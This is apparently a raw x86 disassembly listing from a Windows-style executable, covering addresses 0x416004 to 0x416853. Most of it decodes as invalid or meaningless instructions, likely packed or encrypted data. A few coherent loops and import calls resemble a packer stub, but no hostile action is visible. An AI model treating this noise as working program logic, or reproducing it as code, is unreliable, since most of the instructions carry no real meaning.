  416004:	add    ecx,DWORD PTR [eax-0x76f05d4f]
  41600a:	xor    ecx,DWORD PTR [edx+0x532fbec1]
  416010:	add    BYTE PTR [ecx],cl
  416012:	into   
  416013:	xchg   edx,eax
  416014:	inc    ebp
  416015:	ret    0x8ab7
  416018:	adc    bx,WORD PTR [esi]
  41601b:	adc    eax,0xcd9e501a
  416020:	mov    al,ds:0xd3b71a7d
  416025:	into   
  416026:	(bad)  
  416027:	mov    ebp,0xead2abe9
  41602c:	scas   eax,DWORD PTR es:[edi]
  41602d:	lock in al,dx
  41602f:	scas   eax,DWORD PTR es:[edi]
  416030:	cmp    DWORD PTR [ebp+0x7b30e7cd],esp
  416036:	(bad)  
  416037:	das    
  416038:	sbb    DWORD PTR [edx+0x4fb0028e],esp
  41603e:	mov    ?,WORD PTR [ebx+0x5f16494b]
  416044:	and    ah,BYTE PTR [esi-0x11]
  416047:	adc    al,0xd7
  416049:	or     edx,esp
  41604b:	xlat   BYTE PTR ds:[ebx]
  41604c:	sub    ch,BYTE PTR [edx+0x2a6597bb]
  416052:	in     eax,0xe4
  416054:	sbb    BYTE PTR [eax],bh
  416056:	mov    eax,ds:0x6521e3f5
  41605b:	push   ebx
  41605c:	jb     0x41601b
  41605e:	fmul   st,st(1)
  416060:	js     0x4160de
  416062:	das    
  416063:	dec    eax
  416064:	pop    ss
  416065:	clc    
  416066:	out    dx,eax
  416067:	aad    0xa9
  416069:	xor    edx,DWORD PTR [ebp+0x79144047]
  41606f:	(bad)  
  416070:	addr16 call 0x2f38:0x631759ea
  416078:	jbe    0x41604a
  41607a:	or     DWORD PTR [eax+0x2c],ebp
  41607d:	sub    eax,0xe64e6cae
  416082:	jmp    0x134b:0xe2aa84e
  416089:	icebp  
  41608a:	fadd   QWORD PTR [ecx+eax*4-0x39]
  41608e:	lods   eax,DWORD PTR ds:[esi]
  41608f:	cmp    DWORD PTR [esi+0x11b58d63],ecx
  416095:	sbb    al,0x8b
  416097:	jl     0x41601e
  416099:	dec    eax
  41609a:	jecxz  0x4160ad
  41609c:	jmp    0xb4c1eb9a
  4160a1:	scas   eax,DWORD PTR es:[edi]
  4160a2:	xor    dl,BYTE PTR [esi]
  4160a4:	push   ebx
  4160a5:	fdiv   DWORD PTR [edx+0x2]
  4160a8:	sub    DWORD PTR [ecx-0x1f],esi
  4160ab:	inc    esp
  4160ac:	mov    BYTE PTR [esi+edi*2],ah
  4160af:	lock pop es
  4160b1:	jle    0x416123
  4160b3:	dec    esp
  4160b4:	cli    
  4160b5:	jp     0x4160da
  4160b7:	out    0x9b,al
  4160b9:	mov    cl,0xb1
  4160bb:	or     al,0x61
  4160bd:	cmc    
  4160be:	jp     0x416129
  4160c0:	fld    DWORD PTR [edx+ecx*1+0x2e40e138]
  4160c7:	xlat   BYTE PTR ds:[ebx]
  4160c8:	cli    
  4160c9:	or     esp,DWORD PTR [ebx+0x113c3b20]
  4160cf:	xchg   esi,eax
  4160d0:	push   eax
  4160d1:	call   0x5666be91
  4160d6:	pop    edx
  4160d7:	imul   edi,DWORD PTR [ebp+0x1c7d80f1],0x65dbbb76
  4160e1:	or     al,0x46
  4160e3:	xor    edi,DWORD PTR [eax]
  4160e5:	xchg   edi,eax
  4160e6:	fwait
  4160e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160e8:	ins    DWORD PTR es:[edi],dx
  4160e9:	cmp    bh,BYTE PTR [edx+0x11]
  4160ec:	fidivr DWORD PTR [ecx+0x79]
  4160ef:	hlt    
  4160f0:	icebp  
  4160f1:	(bad)  
  4160f2:	lods   eax,DWORD PTR ds:[esi]
  4160f3:	mov    ecx,0x28751a55
  4160f8:	push   edi
  4160f9:	or     eax,0x2f1a9d91
  4160fe:	mov    ch,0xca
  416100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416101:	aas    
  416102:	or     edx,DWORD PTR [edx-0x264220c9]
  416108:	scas   eax,DWORD PTR es:[edi]
  416109:	imul   edi,DWORD PTR cs:[ebp+0x2dfde234],0xffffffc4
  416111:	dec    edx
  416112:	push   eax
  416113:	iret   
  416114:	stos   BYTE PTR es:[edi],al
  416115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416117:	shr    BYTE PTR [esp+eax*8+0x25fc61ac],0x81
  41611f:	dec    esi
  416120:	retf   
  416121:	xor    al,0xdc
  416123:	or     DWORD PTR [edi],ebp
  416125:	pop    ebx
  416126:	hlt    
  416127:	in     eax,0x23
  416129:	js     0x416185
  41612b:	adc    DWORD PTR [edx-0xa],ebx
  41612e:	mov    edi,0x83e02cb2
  416133:	icebp  
  416134:	mov    BYTE PTR cs:[ebx],0x45
  416138:	data16 (bad) 
  41613b:	in     eax,0x0
  41613d:	jne    0x41617e
  41613f:	sti    
  416140:	sub    eax,DWORD PTR [ebx+0x3e3d37bf]
  416146:	mov    edi,DWORD PTR [ebx-0x1b265f3c]
  41614c:	jb     0x416144
  41614e:	repz inc edi
  416150:	sahf   
  416151:	shl    BYTE PTR [eax-0x74],1
  416154:	fnstsw WORD PTR [ebx-0x50e0f1a6]
  41615a:	and    eax,0xfba261a4
  41615f:	pop    ecx
  416160:	(bad)  
  416161:	fild   QWORD PTR [edi+0xe]
  416164:	mov    bl,dh
  416166:	push   0x712ca7b3
  41616b:	push   ecx
  41616c:	fstp   DWORD PTR [esp+ebx*4-0x1a02f21c]
  416173:	cmc    
  416174:	ret    
  416175:	pop    ecx
  416176:	mov    esi,0xf5524170
  41617b:	sub    DWORD PTR [ecx],ecx
  41617d:	mov    bl,0xac
  41617f:	sbb    ch,cl
  416181:	mov    esi,0xde1a3f8b
  416186:	(bad)
  416189:	xchg   edi,eax
  41618a:	(bad)  
  41618b:	push   ecx
  41618c:	or     edi,ecx
  41618e:	data16 jmp 0x416157
  416191:	call   0xe86b:0x9505bbae
  416198:	clc    
  416199:	test   eax,0xb864bdd0
  41619e:	ja     0x41612d
  4161a0:	cdq    
  4161a1:	js     0x4161be
  4161a3:	inc    ecx
  4161a4:	add    bh,BYTE PTR ds:0xc40d0cde
  4161aa:	lods   al,BYTE PTR ds:[esi]
  4161ab:	sbb    BYTE PTR [eax],cl
  4161ad:	test   BYTE PTR ss:[edi],bh
  4161b0:	gs or  ebx,ebx
  4161b3:	out    dx,eax
  4161b4:	xchg   edi,eax
  4161b5:	popf   
  4161b6:	das    
  4161b7:	rcl    BYTE PTR [edx+0x7b],cl
  4161ba:	call   0xf36f:0xb7d4c91e
  4161c1:	retf   
  4161c2:	mov    ebp,esi
  4161c4:	push   ebx
  4161c5:	push   cs
  4161c6:	xor    esp,DWORD PTR [esi]
  4161c8:	jmp    0x4b11:0x2470870c
  4161cf:	fs js  0x41616b
  4161d2:	pop    edi
  4161d3:	data16 jo 0x4161d5
  4161d6:	jg     0x4161b8
  4161d8:	cli    
  4161d9:	shl    BYTE PTR [ebx+ebp*1-0x16469e61],cl
  4161e0:	rcl    ebp,0xa0
  4161e3:	and    BYTE PTR [ecx+0x1d299c9e],cl
  4161e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ea:	sti    
  4161eb:	push   edi
  4161ec:	imul   eax,DWORD PTR [ebx+eax*1-0x40],0xfc458b96
  4161f4:	mov    DWORD PTR ds:0x42a8ad,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a8ad,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a8ad,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a8ad,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a8ad
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a8ad,edx
  416249:	mov    edx,DWORD PTR ds:0x42a8ad
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a8ad,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a789,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a861,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x1dcbbc46]
  416290:	cdq    
  416291:	mov    esp,0x95787f18
  416296:	jle    0x416310
  416298:	js     0x4162c0
  41629a:	xor    BYTE PTR [esi],bh
  41629c:	pop    es
  41629d:	enter  0xbf98,0x88
  4162a1:	fldln2 
  4162a3:	adc    edi,ebx
  4162a5:	or     eax,DWORD PTR [ebx-0x470c4804]
  4162ab:	pop    ss
  4162ac:	mov    al,0xc1
  4162ae:	push   edi
  4162af:	mov    edi,0x95943e09
  4162b4:	adc    DWORD PTR [esi-0x29cf48a1],edi
  4162ba:	frstor [ebp-0x22605799]
  4162c0:	pop    DWORD PTR [edi+ecx*8]
  4162c3:	rcl    esi,cl
  4162c5:	mov    al,ds:0xcd41c27c
  4162ca:	mov    ebx,0x87242cc0
  4162cf:	jecxz  0x4162f1
  4162d1:	shr    BYTE PTR [ebx+edi*2],1
  4162d4:	daa    
  4162d5:	sub    ch,BYTE PTR [ebx-0x2]
  4162d8:	(bad)  
  4162d9:	enter  0xf3b0,0xfd
  4162dd:	loop   0x41632e
  4162df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e0:	scas   al,BYTE PTR es:[edi]
  4162e1:	dec    esp
  4162e2:	push   0xffffff82
  4162e4:	xchg   esp,ecx
  4162e6:	data16 ins BYTE PTR es:[edi],dx
  4162e8:	ins    BYTE PTR es:[edi],dx
  4162e9:	outs   dx,DWORD PTR ds:[esi]
  4162ea:	adc    DWORD PTR [esi+0x72],edi
  4162ed:	sub    DWORD PTR [edi],ebp
  4162ef:	xor    eax,0xa0ddb54b
  4162f4:	cmp    bl,BYTE PTR [eax+0x3]
  4162f7:	xchg   edi,eax
  4162f8:	push   ebp
  4162f9:	dec    eax
  4162fa:	in     al,0x33
  4162fc:	mov    ah,0xcb
  4162fe:	(bad)  
  4162ff:	repz mov bl,BYTE PTR [ecx]
  416302:	int3   
  416303:	fdiv   QWORD PTR [ecx]
  416305:	scas   eax,DWORD PTR es:[edi]
  416306:	mov    gs,WORD PTR [ebx+0x1f]
  416309:	scas   al,BYTE PTR es:[edi]
  41630a:	jl     0x416372
  41630c:	sbb    al,bh
  41630e:	inc    ebx
  41630f:	in     eax,0xb0
  416311:	cmp    DWORD PTR [esi-0x1251f5e4],eax
  416317:	mov    bh,0x78
  416319:	mov    al,0x84
  41631b:	ret    0x1c00
  41631e:	stos   BYTE PTR es:[edi],al
  41631f:	cmp    DWORD PTR [ecx],esp
  416321:	mov    al,0x0
  416323:	cmp    DWORD PTR [ecx-0x5eb75553],0x3182f1ae
  41632d:	inc    esp
  41632e:	push   ebx
  41632f:	mov    cl,0x43
  416331:	add    al,0x9f
  416333:	xchg   edi,eax
  416334:	push   ds
  416335:	push   0xffffff80
  416337:	cmc    
  416338:	ret    0xb773
  41633b:	int3   
  41633c:	stc    
  41633d:	icebp  
  41633e:	push   ecx
  41633f:	in     eax,0x92
  416341:	stc    
  416342:	push   0xffffffdb
  416344:	push   cs
  416345:	sar    edi,1
  416347:	mov    eax,ds:0xcf32e8af
  41634c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41634d:	outs   dx,BYTE PTR ds:[esi]
  41634e:	out    dx,eax
  41634f:	mov    DWORD PTR [edx],ebx
  416351:	and    al,0x3f
  416353:	cs rcl edx,0xaf
  416357:	mov    eax,0x13880c27
  41635c:	enter  0xd80c,0x9b
  416360:	std    
  416361:	stos   DWORD PTR es:[edi],eax
  416362:	xor    DWORD PTR [edx],ebx
  416364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416365:	lea    ecx,[esi-0x62]
  416368:	fisub  WORD PTR [ebp+0x14fe22ce]
  41636e:	push   ecx
  41636f:	repz test BYTE PTR [esi-0x360a2010],ch
  416376:	outs   dx,BYTE PTR ds:[esi]
  416377:	sub    DWORD PTR [esi-0x30],esi
  41637a:	inc    eax
  41637b:	daa    
  41637c:	adc    al,0xe7
  41637e:	sbb    DWORD PTR [esi],esi
  416380:	sahf   
  416381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416382:	sub    edx,ecx
  416384:	and    BYTE PTR [ebp+0x13],dl
  416387:	shl    DWORD PTR [eax-0xedc8723],0x3f
  41638e:	enter  0x67d8,0x92
  416392:	data16 sahf 
  416394:	shl    DWORD PTR [eax+edx*1],cl
  416397:	jno    0x416348
  416399:	stc    
  41639a:	xchg   BYTE PTR [ecx+ebx*1+0x44182efe],dh
  4163a1:	push   0x5a029d51
  4163a6:	repnz and DWORD PTR [ebx-0x4f],esp
  4163aa:	push   cs
  4163ab:	push   edi
  4163ac:	es sti 
  4163ae:	inc    edx
  4163af:	xor    eax,0x494a72b8
  4163b4:	inc    edx
  4163b5:	fidivr DWORD PTR [ecx-0x42]
  4163b8:	cs sub eax,0x3fa028d0
  4163be:	push   0xc61b9f60
  4163c3:	shl    DWORD PTR [ecx-0x37],1
  4163c6:	dec    ecx
  4163c7:	mov    edi,0xb3ccb53
  4163cc:	hlt    
  4163cd:	jo     0x41644a
  4163cf:	cs ins BYTE PTR es:[edi],dx
  4163d1:	or     ch,cl
  4163d3:	hlt    
  4163d4:	mov    al,ds:0x3890ff91
  4163d9:	mov    eax,ds:0xdb528d52
  4163de:	fs daa 
  4163e0:	add    BYTE PTR [edi+0x33ae172e],cl
  4163e6:	cmp    BYTE PTR [edx],al
  4163e8:	cmp    edx,ebx
  4163ea:	cmc    
  4163eb:	pushf  
  4163ec:	mov    ah,BYTE PTR [eax]
  4163ee:	pcmpeqd mm2,QWORD PTR [edx+0x35c910ce]
  4163f5:	ret    
  4163f6:	int3   
  4163f7:	sub    ebp,DWORD PTR [ecx+0xa716c5]
  4163fd:	enter  0xda25,0xb3
  416401:	mov    ebx,0xc9f6ce71
  416406:	mov    ds:0x9eb9dc2e,al
  41640b:	repz dec ecx
  41640d:	pop    ebp
  41640e:	dec    ebp
  41640f:	bound  edx,QWORD PTR [ebx-0x3919bc10]
  416415:	fld    DWORD PTR [ebx-0x2b]
  416418:	ret    
  416419:	fwait
  41641a:	xchg   BYTE PTR [edi+0x61],bh
  41641d:	sbb    DWORD PTR [esi+0x63],0xa1b57c84
  416424:	inc    esp
  416425:	and    bl,BYTE PTR [edi+0x270e0467]
  41642b:	cmp    DWORD PTR [esi-0xc],0x9455f62f
  416432:	and    BYTE PTR [eax],0xf9
  416435:	mov    al,0x52
  416437:	in     al,0xe
  416439:	int    0x44
  41643b:	iret   
  41643c:	mov    eax,DWORD PTR [ebx+eiz*2+0x45087980]
  416443:	add    bl,BYTE PTR [edx-0x29d55a90]
  416449:	popa   
  41644a:	or     DWORD PTR [eax+0x4a],ecx
  41644d:	aad    0xe6
  41644f:	lock lds edx,FWORD PTR [ebp-0x4b]
  416453:	push   ecx
  416454:	fstp   QWORD PTR [ecx-0x4a529f50]
  41645a:	mov    ecx,0x9a5d29c3
  41645f:	push   ss
  416460:	sbb    eax,0xa8e49bd8
  416465:	and    BYTE PTR [ebp-0x566ba700],dh
  41646b:	or     al,0x7b
  41646d:	mov    ecx,0xeca21147
  416472:	sbb    DWORD PTR [ecx],esi
  416474:	adc    ah,cl
  416476:	add    esi,DWORD PTR [ebx]
  416478:	loope  0x4164e2
  41647a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41647b:	mov    dl,0x4b
  41647d:	dec    esp
  41647e:	iretw  
  416480:	pop    ds
  416481:	pop    es
  416482:	or     DWORD PTR ss:[esi],0x6ecac1c8
  416489:	cld    
  41648a:	sub    esp,DWORD PTR [esi]
  41648c:	test   DWORD PTR [edi+0x69d56b21],ecx
  416492:	jbe    0x416501
  416494:	lock and bh,BYTE PTR [ebp+ebx*4+0x42f69bc]
  41649c:	lea    eax,[ecx+0x72]
  41649f:	mov    ecx,0x940ac50e
  4164a4:	jb     0x4164bc
  4164a6:	adc    DWORD PTR [edi],eax
  4164a8:	adc    BYTE PTR [edx+0x5c],ah
  4164ab:	and    al,0x27
  4164ad:	mov    esi,0x46b3db43
  4164b2:	or     eax,0x33747bef
  4164b7:	lods   al,BYTE PTR ds:[esi]
  4164b8:	sub    BYTE PTR [ebp+0x65],dh
  4164bb:	daa    
  4164bc:	mov    dl,ah
  4164be:	inc    ebx
  4164bf:	(bad)  
  4164c0:	jno    0x41645f
  4164c2:	sar    bp,0x7d
  4164c6:	lock pop esp
  4164c8:	jb     0x4164d7
  4164ca:	sbb    DWORD PTR [ebp+esi*4+0x590e4508],0x8755000a
  4164d5:	jl     0x416498
  4164d7:	(bad)  
  4164d8:	sub    eax,ebx
  4164da:	push   edi
  4164db:	xchg   ebp,eax
  4164dc:	sub    DWORD PTR [edi],eax
  4164de:	les    cx,DWORD PTR [edi-0x75ab68d2]
  4164e5:	dec    ebp
  4164e6:	imul   ebp,DWORD PTR [ecx+0x3f],0xffffffec
  4164ea:	fbld   TBYTE PTR [ebp-0x5d968891]
  4164f0:	cdq    
  4164f1:	sbb    al,0xc8
  4164f3:	sbb    dh,dl
  4164f5:	inc    edx
  4164f6:	out    0x9b,al
  4164f8:	pop    ds
  4164f9:	add    BYTE PTR [esp+eiz*4-0x7d55a7ac],bl
  416500:	imul   ebp,DWORD PTR ds:0x6b255817,0x418d6e43
  41650a:	inc    edx
  41650b:	jl     0x41657c
  41650d:	sub    BYTE PTR [ebx-0x6b87bdc1],al
  416513:	xor    eax,0xe970c7a0
  416518:	jbe    0x416568
  41651a:	out    dx,al
  41651b:	inc    edx
  41651c:	ret    0xfa8
  41651f:	add    DWORD PTR [eax-0x145d9b28],esp
  416525:	push   eax
  416526:	repz into 
  416528:	fs repz or al,0x58
  41652d:	aas    
  41652e:	fbld   TBYTE PTR [ebp+0x7e694ef]
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x5e37c66],cl
  416557:	(bad)  
  416558:	sub    DWORD PTR [eax+0x787f1dd9],eax
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x41654a
  416563:	mov    dh,0x4
  416565:	pop    esp
  416566:	ja     0x4164fd
  416568:	addr16 and al,0xd4
  41656b:	adc    eax,ecx
  41656d:	addr16 std 
  41656f:	pop    ecx
  416570:	dec    esi
  416571:	jae    0x41658b
  416573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416574:	inc    ecx
  416575:	inc    ebx
  416576:	pop    edi
  416577:	adc    bl,ah
  416579:	lods   al,BYTE PTR ds:[esi]
  41657a:	lods   eax,DWORD PTR ds:[esi]
  41657b:	cdq    
  41657c:	sub    BYTE PTR [ecx+0x59509ad5],bh
  416582:	cmp    BYTE PTR [eax],dl
  416584:	mov    gs,WORD PTR [edi+0x2fe2f35d]
  41658a:	pop    edx
  41658b:	imul   ebx,DWORD PTR [ecx+eiz*2],0x362b184b
  416592:	mov    edi,0x7d43f86b
  416597:	nop
  416598:	cmc    
  416599:	xor    edx,0x707ab5fa
  41659f:	test   al,0x8
  4165a1:	(bad)  
  4165a2:	jne    0x780d0bac
  4165a8:	mov    eax,ds:0xc8340833
  4165ad:	rol    DWORD PTR [edx-0x3f5bb104],1
  4165b3:	dec    ebx
  4165b4:	xor    eax,0x3f7f599b
  4165b9:	adc    al,0xd2
  4165bb:	call   0x5791:0xd587fee1
  4165c2:	call   0xf1e4:0x7da340d
  4165c9:	mov    bl,0x60
  4165cb:	xor    al,0xe9
  4165cd:	icebp  
  4165ce:	repnz sbb al,0x51
  4165d1:	adc    al,0x2d
  4165d3:	mov    bl,0x53
  4165d5:	inc    ebp
  4165d6:	(bad)  
  4165d7:	nop
  4165d8:	sub    al,0x25
  4165da:	test   BYTE PTR [edx+0x4e],ah
  4165dd:	mov    al,0x3d
  4165df:	mov    ds:0x926e66d8,al
  4165e4:	ja     0x41664d
  4165e6:	sub    al,0x5
  4165e8:	icebp  
  4165e9:	mul    DWORD PTR [ecx+esi*4+0x7a]
  4165ed:	xor    DWORD PTR [edx+ebx*2],esp
  4165f0:	in     eax,0x18
  4165f2:	das    
  4165f3:	ror    DWORD PTR [edx-0x550696e],0x30
  4165fa:	add    eax,0x77382b73
  4165ff:	pop    ecx
  416600:	call   0xa033:0x99633070
  416607:	fsub   st(1),st
  416609:	sub    BYTE PTR [eax+0x10],ah
  41660c:	mov    ds:0x5f02453,eax
  416611:	sub    BYTE PTR [ebx],al
  416613:	xchg   edx,eax
  416614:	je     0x4165ce
  416616:	xchg   ebp,eax
  416617:	ret    
  416618:	mov    edi,0x7aa40e2
  41661d:	aas    
  41661e:	mov    bh,0x67
  416620:	les    ebp,FWORD PTR [ebx+eiz*8]
  416623:	fistp  DWORD PTR [esi-0x83b9428]
  416629:	push   es
  41662a:	xor    eax,0x6186de05
  41662f:	shl    DWORD PTR [ebx],cl
  416631:	into   
  416632:	and    eax,0x4d5c35dd
  416637:	and    ebx,eax
  416639:	adc    BYTE PTR [edx+0x8],dh
  41663c:	pop    ecx
  41663d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41663e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41663f:	jnp    0x416613
  416641:	mov    ecx,0x7997c69a
  416646:	bound  ebx,QWORD PTR [edx]
  416648:	xchg   esi,eax
  416649:	ret    
  41664a:	mov    ah,0xb2
  41664c:	iret   
  41664d:	jnp    0x4166ca
  41664f:	or     BYTE PTR [ebx],al
  416651:	and    eax,0x338a2e89
  416656:	iret   
  416657:	sbb    al,al
  416659:	ret    0x3017
  41665c:	adc    al,0x78
  41665e:	jmp    0x41664d
  416660:	into   
  416661:	xlat   BYTE PTR ds:[ebx]
  416662:	mov    bl,0x3a
  416664:	outs   dx,DWORD PTR ds:[esi]
  416665:	cmp    DWORD PTR [edi+0x4a],ecx
  416668:	lods   al,BYTE PTR ds:[esi]
  416669:	push   ebx
  41666a:	icebp  
  41666b:	mov    DWORD PTR [edx-0x7e],edi
  41666e:	cmp    al,dh
  416670:	daa    
  416671:	fadd   st,st(5)
  416673:	cmp    eax,0xf88a5e3
  416678:	adc    eax,0x11daa1b5
  41667d:	adc    BYTE PTR [eax],0xa3
  416680:	add    cl,BYTE PTR [ecx+0xb72306e]
  416686:	push   edx
  416687:	pusha  
  416688:	les    ecx,FWORD PTR [eax-0x52]
  41668b:	jle    0x416687
  41668d:	push   ecx
  41668e:	jmp    0xa36f:0x23e4f7e0
  416695:	ja     0x4166d2
  416697:	pusha  
  416698:	js     0x4166be
  41669a:	aaa    
  41669b:	ds xor al,0x93
  41669e:	sbb    bl,ah
  4166a0:	addr16 push esi
  4166a2:	adc    al,0x60
  4166a4:	xlat   BYTE PTR ds:[ebx]
  4166a5:	sub    DWORD PTR ds:0x96661cf7,ecx
  4166ab:	ret    
  4166ac:	gs cs inc esi
  4166af:	pop    ecx
  4166b0:	pcmpgtb mm4,QWORD PTR [ecx-0x5c]
  4166b4:	inc    dx
  4166b6:	xchg   ecx,eax
  4166b7:	or     dl,cl
  4166b9:	mov    esp,0x3901fe20
  4166be:	xor    edi,DWORD PTR [ecx-0x66742a96]
  4166c4:	dec    eax
  4166c5:	and    eax,0x2b7b629d
  4166ca:	pop    es
  4166cb:	inc    esi
  4166cc:	jmp    0x37e465a0
  4166d1:	pop    ebp
  4166d2:	jge    0x416707
  4166d4:	fist   DWORD PTR [ebp+0x6c]
  4166d7:	ja     0x41671c
  4166d9:	leave  
  4166da:	cmc    
  4166db:	popa   
  4166dc:	jmp    0xc2554804
  4166e1:	inc    esi
  4166e2:	aam    0x39
  4166e4:	fimul  WORD PTR [ebp-0x4afa07bb]
  4166ea:	ret    
  4166eb:	fcomp  QWORD PTR [ecx+0x51]
  4166ee:	rcr    BYTE PTR [edi-0x5c06b10d],0x62
  4166f5:	mov    al,0x86
  4166f7:	aad    0x37
  4166f9:	jmp    0x3930:0x6cf755ec
  416700:	push   esi
  416701:	jb     0x4166eb
  416703:	(bad)  
  416704:	or     eax,0x56297a94
  416709:	jno    0x416772
  41670b:	sbb    al,0x62
  41670d:	xchg   ecx,eax
  41670e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41670f:	ror    BYTE PTR [eax+0x20],cl
  416712:	int    0x3c
  416714:	add    BYTE PTR [esi+0x77],0xe8
  416718:	push   esi
  416719:	mov    ah,0xc9
  41671b:	inc    esi
  41671c:	enter  0x77a3,0xb3
  416720:	sub    bh,BYTE PTR [ecx]
  416722:	and    ecx,DWORD PTR [eax+0x5]
  416725:	add    al,0xa1
  416727:	push   ebx
  416728:	push   edx
  416729:	stos   DWORD PTR es:[edi],eax
  41672a:	or     esp,DWORD PTR [edi]
  41672c:	lahf   
  41672d:	add    ebp,DWORD PTR ds:0x4f98aae8
  416733:	push   0x66
  416735:	jecxz  0x41672b
  416737:	loopne 0x416734
  416739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41673a:	push   eax
  41673b:	cdq    
  41673c:	mov    WORD PTR gs:[eax+0x5c],es
  416740:	leave  
  416741:	mov    BYTE PTR [ecx],0x77
  416744:	dec    DWORD PTR [edi]
  416746:	mov    BYTE PTR [edx],cl
  416748:	imul   edi,DWORD PTR [ebx-0x72af7bc1],0xa054025b
  416752:	mov    dl,0xe2
  416754:	sub    al,0x1b
  416756:	push   eax
  416757:	mov    DWORD PTR [ecx],esi
  416759:	sbb    dh,0x20
  41675c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41675d:	ret    0xf3df
  416760:	adc    edi,DWORD PTR [edx+ebp*1+0x1c]
  416764:	or     al,0x6
  416766:	std    
  416767:	repnz loop 0x416718
  41676a:	outs   dx,BYTE PTR ds:[esi]
  41676b:	fld    DWORD PTR [esi-0x404a43bc]
  416771:	xchg   edi,eax
  416772:	lahf   
  416773:	xchg   ebp,eax
  416774:	push   esi
  416775:	out    0x36,al
  416777:	aaa    
  416778:	imul   esi,DWORD PTR [ebx+0x5a],0xffffffe7
  41677c:	mov    esi,0x915cb65a
  416781:	xchg   ecx,eax
  416782:	pushf  
  416783:	icebp  
  416784:	clc    
  416785:	push   edx
  416786:	aam    0x22
  416788:	add    al,0x3
  41678a:	jge    0x4167df
  41678c:	fucomi st,st(7)
  41678e:	adc    BYTE PTR [edi],ah
  416790:	dec    edi
  416791:	fdiv   QWORD PTR [ebx-0x34]
  416794:	(bad)  
  416795:	mov    ebx,0x8628ddd7
  41679a:	cmp    ebx,0xffffff8c
  41679d:	cmp    BYTE PTR ds:0xef9e32d6,dh
  4167a3:	inc    esi
  4167a4:	repnz mov ch,0xf5
  4167a7:	xor    eax,0x1ae879db
  4167ac:	mov    ah,BYTE PTR [ebx+0x61bcdaf3]
  4167b2:	(bad)  
  4167b3:	sub    al,0x31
  4167b5:	(bad)  
  4167b6:	imul   esi,DWORD PTR [ecx+0x5823b8ea],0xd3a9c4df
  4167c0:	test   al,0x48
  4167c2:	push   es
  4167c3:	lock aam 0x6b
  4167c6:	adc    eax,0xcda3ede
  4167cb:	sub    BYTE PTR [edi+0xf6901f3],al
  4167d1:	jbe    0x416824
  4167d3:	add    BYTE PTR [esi+ecx*1+0x16],dh
  4167d7:	(bad)  
  4167d8:	inc    BYTE PTR [edi+0xacd94bc]
  4167de:	mov    ah,0xed
  4167e0:	rol    DWORD PTR [ecx-0x11dc530e],0x2
  4167e7:	pop    ds
  4167e8:	pop    ss
  4167e9:	sbb    eax,0xee79f793
  4167ee:	jmp    0x449420a6
  4167f3:	out    dx,eax
  4167f4:	bound  edi,QWORD PTR [ebp-0x29]
  4167f7:	add    DWORD PTR [ebp-0x3d542cd4],esi
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	mov    al,0x43
  41681a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41681b:	and    eax,0x787f2376
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x41682a
  416825:	cdq    
  416826:	cmp    al,0x29
  416828:	adc    dl,0xf5
  41682b:	je     0x4167ef
  41682d:	aas    
  41682e:	outs   dx,DWORD PTR ds:[esi]
  41682f:	xor    edi,0x61bc869b
  416835:	inc    esp
  416836:	movsx  esi,WORD PTR [ebp-0x776003f]
  41683d:	into   
  41683e:	mov    eax,ds:0x3f501858
  416843:	xchg   ebx,eax
  416844:	adc    al,0xf8
  416846:	xchg   di,ax
  416848:	(bad)  
  416849:	fild   WORD PTR [edi+0x56]
  41684c:	or     BYTE PTR ds:0xa29db193,0x32
  416853:	enter  0x7cce,0xd0
